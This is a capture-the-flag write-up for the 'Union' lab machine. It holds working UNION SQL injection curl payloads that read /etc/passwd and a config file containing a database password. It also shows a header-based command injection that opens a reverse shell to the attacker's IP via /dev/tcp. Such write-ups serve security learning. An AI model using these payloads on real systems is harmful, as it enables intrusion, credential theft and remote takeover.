# Union

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.96.75
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 11:22 EDT
Nmap scan report for 10.129.96.75
Host is up (0.0088s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

The name implies I should be looking for some type of UNION SQL Injection somewhere...

### UNION Injection

This reveals a simple website that takes one user input:

<figure><img src="../../../.gitbook/assets/image (4005).png" alt=""><figcaption></figcaption></figure>

If we enter anything, it says that we are eligible to compete in the tournament and gives us a link to `challenge.php`.&#x20;

<figure><img src="../../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

Since this was a UHC box, `sqlmap` revealed nothing to me, so we have to do this manually. I tried some basic SQL Injection with UNION, and found that it was indeed vulnerable to SQL Injection:

```
$ curl -X POST http://10.129.96.75/ -d "player=user'union select user(); -- -"
Sorry, uhc@localhost you are not eligible due to already qualifying.
```

So now we need to enumerate the database and grab the flag.:

{% code overflow="wrap" %}
```
$ curl -X POST http://10.129.96.75/ -d "player=user'union select group_concat(schema_name) from information_schema.schemata; -- -"
mysql,information_schema,performance_schema,sys,november

$ curl -X POST http://10.129.96.75/ -d "player=user'union select group_concat(table_name) from information_schema.tables WHERE table_schema='november'; -- -"
flag,players

$ curl -X POST http://10.129.96.75/ -d "player=user'union select group_concat(column_name) from information_schema.columns WHERE table_schema='november'; -- -"
one,player

$ curl -X POST http://10.129.96.75/ -d "player=user'union select group_concat(one) from flag; -- -"
UHC{F1rst_5tep_2_Qualify}
```
{% endcode %}

Once we submit the flag, we have SSH access, but we still have no password.

<figure><img src="../../../.gitbook/assets/image (2334).png" alt=""><figcaption></figcaption></figure>

### SSH Creds

Since we still had UNION injection, we can use the `load_file` function to have LFI.&#x20;

```
$ curl -X POST http://10.129.96.75/ -d "player=user' union select load_file('/etc/passwd'); -- -"
Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
<TRUNCATED>
```

First we need to identify what files are present on the site. I know that it is PHP-based, so let's start there.&#x20;

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.96.75 -x php -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.96.75
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/05/08 11:38:12 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 162]
/.htpasswd            (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 178] [-> http://10.129.96.75/css/]
/firewall.php         (Status: 200) [Size: 13]
/index.php            (Status: 200) [Size: 1220]
/index.php            (Status: 200) [Size: 1220]
```

There's a `config.php` file, and we can read that:

```
$ curl -X POST http://10.129.96.75/ -d "player=user' union select load_file('/var/www/html/config.php'); -- -"
Sorry, <?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
 you are not eligible due to already qualifying.
```

With that, we can SSH into the machine.

<figure><img src="../../../.gitbook/assets/image (855).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Command Injection -> Sudo

There's another user on the machine:

```
uhc@union:/home$ ls -la
total 16
drwxr-xr-x 1 root root  12 Nov  8  2021 .
drwxr-xr-x 1 root root 164 Jul  2  2021 ..
drwxr-xr-x 1 htb  htb  158 Nov  8  2021 htb
drwxr-xr-x 1 uhc  uhc  108 Nov  8  2021 uhc
```

There isn't much that this user can access. So let's view the website files. The `firewall.php` file is the one that provided us with access to SSH, and it has some vulnerable code:

```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>

```

This uses the `X-Forwarded-For` HTTP header variable and passes it directly into a command with `sudo`. Using this request, we can get another reverse shell as `www-data`.

```http
GET /firewall.php HTTP/1.1
Host: 10.129.96.75
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.96.75/challenge.php
Connection: close
X-Forwarded-For: 1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.13/4444 0>&1";
Cookie: PHPSESSID=jg4bjv3vg5pol32mv1teq3i0pp
Upgrade-Insecure-Requests: 1

```

<figure><img src="../../../.gitbook/assets/image (3262).png" alt=""><figcaption></figcaption></figure>

When checking our `sudo` privileges, this is what we see:

```
www-data@union:~/html$ sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
```

<figure><img src="../../../.gitbook/assets/image (2741).png" alt=""><figcaption></figcaption></figure>
